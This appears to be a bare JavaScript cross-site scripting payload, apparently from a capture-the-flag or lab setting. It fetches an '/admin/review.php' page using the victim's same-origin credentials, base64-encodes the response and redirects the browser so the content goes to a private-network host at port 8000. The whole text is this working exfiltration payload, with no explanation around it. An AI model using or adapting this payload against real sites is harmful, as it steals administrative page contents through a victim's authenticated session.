fetch("/admin/review.php",{credentials:"same-origin"}).then(r=>r.text()).then(t=>{
  location = "http://10.133.3.211:8000/a?d=" + encodeURIComponent(btoa(unescape(encodeURIComponent(t))));
});
